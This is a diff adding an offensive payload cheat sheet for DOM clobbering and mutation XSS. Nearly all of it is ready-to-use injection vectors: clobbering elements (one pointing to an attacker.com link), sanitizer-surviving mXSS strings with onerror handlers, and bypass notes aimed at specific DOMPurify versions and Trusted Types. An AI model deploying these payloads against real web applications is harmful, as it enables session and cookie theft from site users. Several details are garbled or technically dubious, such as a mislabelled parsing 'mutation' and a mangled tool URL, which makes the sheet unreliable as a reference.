@@ -1,0 +1,58 @@
+# DOM CLOBBERING + MUTATION XSS (mXSS) - 2026 pack
+# For sinks like innerHTML after sanitizer, and old parsers (XMP/IFRAME/style) that
+# re-parse markup AFTER sanitization (mutation).
+
+## 1) CONCEPT
+# DOM clobbering: an HTML element creates/improvises a JS identifier collision:
+#   <form id=x><input name=attributes></form>   -> x.attributes points to the INPUT, not the attr map.
+# mXSS: sanitizer output that the browser RE-PARSES into active HTML (deep parser mismatch).
+
+## 2) DOM CLOBBER - ID/name collisions
+# collide with global/browser + framework internals:
+<form id=config><input name=host url=x></form>        # e.g. config.url is the input
+<a id=TestObject href="//attacker.com">safe</a>       # clobber TestObject in JS checks
+<img name=body class=evilTag>   # document.body collision after sanitizer keeps img
+<iframe name=window> ...        # iframe names clobber window.window/ these windows
+<a id=toString href=javascript:alert(1)>  # some libs call toString on config objects
+
+## 3) Cherry-picked clobber-to-XSS patterns
+# 1) clobber global function then invoke:
+<img name=alert src=x>  +  window.alert.call(window,document.cookie)
+#    (window.alert is no longer a function - attacker forced a call surface)
+# 2) Angular/Vue internals: {{this.constructor.constructor('alert(1)')()}} with a clobbered
+#    "this" via:  <img name=this src=x>
+# 3) jQuery: $.extend with clobbered prototype
+# 4) URL parameter arrays: ?config<a>=x  -> config becomes object w/ a property (DOM clobber by param name)
+#    <img name=config> + config.attributes === [the img] not attr map
+
+## 4) MUTATION XSS - vectors that survive sanitizers (verify each, sanitizer version matters)
+# classic <noscript><style> and <template> wrappers (re-parsed text becomes markup):
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<style>@import'</style><img src=x onerror=alert(1)>';
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+# <iframe> import + srcdoc mutation path:
+<iframe srcdoc="<svg/onload=alert(1)>"></iframe>
+# <xmp> mutation (decoded twice - do not double-escape):
+<xmp><img src=x onerror=alert(1)></xmp>
+# <plaintext> continues to parse as text until a token is hit:
+<plaintext><img src=x onerror=alert(1)>
+# attribute hijack via newline (attribute injection):
+<img src=x\nonerror=alert(1)>
+# URL-scheme parsing mutation:
+<img src="x"onerror="alert(1)">
+# CSS: old IE behaviour()/'expression()' (filter-level only; still relevant for old-target reports)
+
+## 5) TRUSTED-TYPES/CSP interaction notes
+# Trusted Types blocks innerHTML sinks - until a script smuggles a polyfill:
+Element.prototype.setAttribute.toString = function(){alert(1)}     # tests TT misconfig
+# with CSP nonce: <script nonce=test>alert(1)</script> only works if nonce is app-issued and leaked.
+
+## 6) REAL-WORLD MATCH ORDER (2024-2026 bug reports)
+# most common wins: <form id>clobber -> sanitizer config bypass; <img name=toString>
+# + Tainted-From param; the mtr/mg glyph table trick on DOMPurify <= 2.3.x; <xmp> + textarea
+# re-parse after CSP strict-dynamic (1.1). Older ones: <a href clobber> on admins.
+
+## 7) TESTERS
+# - DOMPurify regression suite: https://r.jina.ai/https://raw.githubusercontent.com/cure53/DOMPurify/main/test/dfs.html
+# - metamorfoser, xssor (mXSS fuzzers) - pair with your target's sanitizer.
+# - Electron pattern: webview/sercel domain xss -> nodeIntegration @ BrowserWindow (see Framework_RCE).
